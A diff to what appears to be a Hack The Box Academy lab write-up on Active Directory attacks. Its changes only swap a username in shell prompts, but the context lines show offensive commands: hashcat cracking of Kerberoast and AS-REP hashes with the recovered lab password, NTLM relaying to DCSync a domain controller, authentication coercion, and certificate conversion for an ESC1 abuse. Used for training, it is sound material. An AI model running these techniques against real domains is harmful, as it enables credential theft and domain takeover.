@@ -289,7 +289,7 @@ Once connected to the VPN, you may access the Windows machine via RDP. Most Linu
 &#x20; Overview
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ xfreerdp /u:eagle\\bob /p:Slavi123 /v:TARGET_IP /dynamic-resolution
+root@htb[/htb]$ xfreerdp /u:eagle\\bob /p:Slavi123 /v:TARGET_IP /dynamic-resolution
 ```
 
 ![xfreeRDP](https://academy.hackthebox.com/storage/modules/176/Lab/RDPWindows.png)
@@ -307,7 +307,7 @@ Once connected to the VPN, we can access the Kali machine via SSH. The credentia
 &#x20; Overview
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ ssh kali@TARGET_IP
+root@htb[/htb]$ ssh kali@TARGET_IP
 ```
 
 ![SSH connection](https://academy.hackthebox.com/storage/modules/176/Lab/SSHKali.png)
@@ -317,7 +317,7 @@ AbdulrahmanTamim@htb[/htb]$ ssh kali@TARGET_IP
 &#x20; Overview
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ xfreerdp /v:TARGET_IP /u:kali /p:kali /dynamic-resolution
+root@htb[/htb]$ xfreerdp /v:TARGET_IP /u:kali /p:kali /dynamic-resolution
 ```
 
 ***
@@ -333,7 +333,7 @@ To access the folder from the Kali machine, you can use the 'smbclient' command.
 &#x20; Overview
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ smbclient \\\\TARGET_IP\\Share -U eagle/administrator%Slavi123
+root@htb[/htb]$ smbclient \\\\TARGET_IP\\Share -U eagle/administrator%Slavi123
 ```
 
 ![Share Folder connection](https://academy.hackthebox.com/storage/modules/176/Lab/share2.png)
@@ -418,7 +418,7 @@ We can use `hashcat` with the hash-mode (option `-m`) `13100` for a `Kerberoasta
 &#x20; Kerberoasting
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ hashcat -m 13100 -a 0 spn.txt passwords.txt --outfile="cracked.txt"
+root@htb[/htb]$ hashcat -m 13100 -a 0 spn.txt passwords.txt --outfile="cracked.txt"
 
 hashcat (v6.2.5) starting
 
@@ -468,7 +468,7 @@ Once `hashcat` finishes cracking, we can read the file 'cracked.txt' to see the 
 &#x20; Kerberoasting
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ cat cracked.txt
+root@htb[/htb]$ cat cracked.txt
 
 $krb5tgs$23$*Administrator$eagle.local$http/pki1@eagle.local*$ab67a0447d7db2945a28d19802d0da64$b6a6a8d3fa2e9e6b47dac1448ade064b5e9d7e04eb4adb5d97a3ef5fd35c8a5c3b9488f09a98b5b8baeaca48483df287495a31a59ccb07209c84e175eef91dc5e4ceb9f7865584ca906965d4bff757bee3658c3e3f38b94f7e1465cd7745d0d84ff3bb67fe370a07cb7f5f350aa26c3f292ee1d7bc31b97db7543182a950c4458ee45f1ff58d1c03b713d11a559f797b85f575aabb72de974cf48c80cbbc78db245c496d3f78c50de655e6572627904753fe223148bc32063c6f032ecdcb901012a98c029de2676905aff97024c89c9d62a73b5f4a614dfd37b90a30a3335326c61b27e788619f84dc0993661be9a9d631d8e4d89d70023b27e5756a23c374f1a59ed15dbe28147296fae252a6d55d663d61759d6ee002b4d3814ada1cafb8997ed594f1cfab6cdb503058b73e192228257d834fd420e9dbc5c12cfffb2077aa5f2abef8cac07ee6cdc7630be71ed174ee167ea0d95df14f48e3e576aa4f90b23d44378d4533cbad945b830bf59f2814ff2dec8832561c3c67bd43afebb231d8f16b1f218dfda803619a47ac833330dde29b34eb73a4aba7da93d7664b92534e44beb80b5ad22a5f80d72f5c476f1796d041ade455eee50651d746db75490bd9a7165b2638c79973fc03c63a67e2659e3057fbe2bce22175116a3892e95a418a02908e0daea3293dc01cd172b524217efe56d842cf8b6f369f30657cd40fe482467d4f2a3a7f3c1caf52cf5f2afc7454fb934a0fb13a0da76dbcefecc32da3a719cd37f944ea13589ce373163d56eb5e8c2dc3fb567b1c5959b7e4e3e054ea9a5561776bed7c2d9eb3107645efce5d22a033891758ac57b187a19006abdbe3f5d53edfc09e5359bc52538afef759c37fbe00cc46e4968ec69072761c2c796bd8e924521cc6c3a50fc1db09e5ce1d443ff3962ca1878904a8252d4f827bcb1e6d6c38bf1fd8ccc21d70751008ece94699aa3caa7e671cb48afc8eb3ecbf181c6e0ed52f740f07e87025c28e4fd832192a66bc390923ea397527264fe382056be78d791f80d0343bbf60ffd09dce061825595f69b939eaa517dc89f4527094bda0ae6febb03d8af3fb3e527e8b5501bbd807ed23ed9bcf85b74be699bd42a284318c42d90dbbd4df332d654529b23a5d81bedec69dba2f3e308d7f8db058377055c15b9eae6275f60a7ec1d52077546caa2b78cf798769a0096d590bb5d5d5173a67a32c2eba174e067a9bf8b4e1f190f8816bf2d6741a8bd6e4e1a6e7ca5ac745061a93cde0ab03ee8cf1de80afa0674a4248d38efdc77aca269e2388c43c83a3919ef80e9a9f0005b1b40026fc29e6262091cbc4f062cf95d5d7e051c019cd0bd5e85b8dcb16b17fd92820e1e1581265a4472c3a5d1f42bb2c:Slavi123
 ```
@@ -599,7 +599,7 @@ We can now use `hashcat` with the hash-mode (option -m) `18200` for `AS-REPRoast
 &#x20; AS-REProasting
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sudo hashcat -m 18200 -a 0 asrep.txt passwords.txt --outfile asrepcrack.txt --force
+root@htb[/htb]$ sudo hashcat -m 18200 -a 0 asrep.txt passwords.txt --outfile asrepcrack.txt --force
 
 hashcat (v6.2.5) starting
 
@@ -645,7 +645,7 @@ Once `hashcat` cracks the password, we can print the contents of the output file
 &#x20; AS-REProasting
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sudo cat asrepcrack.txt
+root@htb[/htb]$ sudo cat asrepcrack.txt
 
 $krb5asrep$23$anni@eagle.local:1b912b858c4551c0013dbe81ff0f01d7$c64803358a43d05383e9e01374e8f2b2c92f9d6c669cdc4a1b9c1ed684c7857c965b8e44a285bc0e2f1bc248159aa7448494de4c1f997382518278e375a7a4960153e13dae1cd28d05b7f2377a038062f8e751c1621828b100417f50ce617278747d9af35581e38c381bb0a3ff246912def5dd2d53f875f0a64c46349fdf3d7ed0d8ff5a08f2b78d83a97865a3ea2f873be57f13b4016331eef74e827a17846cb49ccf982e31460ab25c017fd44d46cd8f545db00b6578150a4c59150fbec18f0a2472b18c5123c34e661cc8b52dfee9c93dd86e0afa66524994b04c5456c1e71ccbd2183ba0c43d2550:Slavi123
 ```
@@ -1786,7 +1786,7 @@ To begin, we will configure `NTLMRelayx` to forward any connections to DC2 and a
 &#x20; Print Spooler & NTLM Relaying
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ impacket-ntlmrelayx -t dcsync://172.16.18.4 -smb2support
+root@htb[/htb]$ impacket-ntlmrelayx -t dcsync://172.16.18.4 -smb2support
 
 Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 
@@ -1950,7 +1950,7 @@ Next, we need to know the IP address of WS001, which we can be obtain by running
 &#x20; Coercing Attacks & Unconstrained Delegation
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ Coercer -u bob -p Slavi123 -d eagle.local -l ws001.eagle.local -t dc1.eagle.local
+root@htb[/htb]$ Coercer -u bob -p Slavi123 -d eagle.local -l ws001.eagle.local -t dc1.eagle.local
 
        ______
       / ____/___  ___  _____________  _____
@@ -2405,7 +2405,7 @@ Once the attack finishes, we will obtain a certificate successfully. The command
 &#x20; PKI - ESC1
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sed -i 's/\s\s\+/\n/g' cert.pem
+root@htb[/htb]$ sed -i 's/\s\s\+/\n/g' cert.pem
 ```
 
 Then we can execute the `openssl` command mentioned in the output of Certify.
@@ -2413,7 +2413,7 @@ Then we can execute the `openssl` command mentioned in the output of Certify.
 &#x20; PKI - ESC1
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
+root@htb[/htb]$ openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
 ```
 
 ![Convert PEM to PFX](https://academy.hackthebox.com/storage/modules/176/A13/convertPEM.png)
